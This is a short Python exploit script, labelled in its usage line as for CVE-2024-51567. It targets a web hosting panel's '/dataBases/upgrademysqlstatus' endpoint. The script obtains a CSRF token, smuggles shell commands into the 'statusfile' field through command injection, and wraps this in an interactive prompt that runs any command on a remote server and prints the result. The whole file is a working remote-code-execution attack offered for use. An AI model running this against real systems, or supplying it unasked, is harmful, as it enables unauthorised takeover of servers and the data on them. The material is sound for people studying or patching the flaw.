import httpx
import sys

def get_CSRF_token(client):
    resp = client.get("/")
    
    # Debugging untuk melihat semua cookies yang diterima
    print("Cookies received:", resp.cookies)
    
    # Pengecekan apakah 'csrftoken' ada di cookies
    if 'csrftoken' in resp.cookies:
        return resp.cookies['csrftoken']
    else:
        print("Error: CSRF token not found in cookies.")
        sys.exit(1)  # Menghentikan program jika CSRF token tidak ditemukan

def pwn(client, CSRF_token, cmd):
    headers = {
        "X-CSRFToken": CSRF_token,
        "Content-Type": "application/json",
        "Referer": str(client.base_url)
    }
    payload = '{"statusfile":"/dev/null; %s; #","csrftoken":"%s"}' % (cmd, CSRF_token)
    return client.put("/dataBases/upgrademysqlstatus", headers=headers, data=payload).json()["requestStatus"]

def exploit(client, cmd):
    CSRF_token = get_CSRF_token(client)
    stdout = pwn(client, CSRF_token, cmd)
    print(stdout)

if __name__ == "__main__":
    # Cek jika argumen target tidak diberikan
    if len(sys.argv) < 2:
        print("Usage: python CVE-2024-51567.py <target-url>")
        sys.exit(1)

    target = sys.argv[1]
    client = httpx.Client(base_url=target, verify=False)
    
    while True:
        cmd = input("$> ")
        exploit(client, cmd)
